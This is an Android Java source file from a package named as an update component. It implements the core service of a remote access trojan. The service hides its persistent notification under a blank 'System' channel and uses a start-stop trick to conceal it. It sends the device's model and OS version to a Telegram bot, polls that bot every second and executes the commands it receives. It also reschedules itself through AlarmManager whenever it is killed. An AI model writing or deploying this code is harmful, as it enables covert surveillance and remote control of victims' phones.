package com.kasari.update;

import android.app.*;
import android.content.*;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.*;

public class BackgroundService extends Service {

    static final String CH_ID    = "kc_hidden";
    static final int    NOTIF_ID = 9901;

    private volatile boolean mRunning = false;
    private Thread mPollThread;
    static String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        TelegramController.init(this);
        deviceId = getOrCreateDeviceId();
        startHiddenForeground();
        mRunning = true;
        startPolling();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!mRunning) { mRunning = true; startPolling(); }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        mRunning = false;
        if (mPollThread != null) mPollThread.interrupt();
        super.onDestroy();
        Intent restart = new Intent(this, BackgroundService.class);
        // FLAG_IMMUTABLE added in API 23 — older devices crash without version check
        int piFlags = PendingIntent.FLAG_ONE_SHOT |
            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                ? PendingIntent.FLAG_IMMUTABLE : 0);
        PendingIntent pi = PendingIntent.getService(this, 1, restart, piFlags);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am != null)
            am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 3000, pi);
    }

    @Override public IBinder onBind(Intent i) { return null; }

    private void startPolling() {
        mPollThread = new Thread(() -> {
            TelegramController.sendMessage(
                "\uD83D\uDCF1 [" + deviceId + "] Online\n" +
                "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "/help = sare commands");
            while (mRunning) {
                try {
                    JSONArray updates = TelegramController.getUpdates();
                    for (int i = 0; i < updates.length(); i++) {
                        JSONObject upd = updates.getJSONObject(i);
                        JSONObject msg = upd.optJSONObject("message");
                        if (msg == null) continue;
                        String text = msg.optString("text", "").trim();
                        if (!text.isEmpty())
                            CommandProcessor.handle(this, text);
                    }
                } catch (Exception e) { e.printStackTrace(); }
                try { Thread.sleep(1000); } catch (InterruptedException ignored) { break; }
            }
        });
        mPollThread.setDaemon(true);
        mPollThread.start();
    }

    private void startHiddenForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            nm.createNotificationChannel(ch);
        }
        Notification notif = new NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("System")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build();
        startForeground(NOTIF_ID, notif);
        startService(new Intent(this, InnerService.class));
    }

    private String getOrCreateDeviceId() {
        SharedPreferences p = getSharedPreferences("kc_prefs", MODE_PRIVATE);
        String id = p.getString("device_id", null);
        if (id == null) {
            id = "DEV" + System.currentTimeMillis() % 10000;
            p.edit().putString("device_id", id).apply();
        }
        return id;
    }

    public static class InnerService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startForeground(NOTIF_ID,
                new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(R.drawable.ic_notification).build());
            stopForeground(true);
            stopSelf();
            return START_NOT_STICKY;
        }
        @Override public IBinder onBind(Intent i) { return null; }
    }
}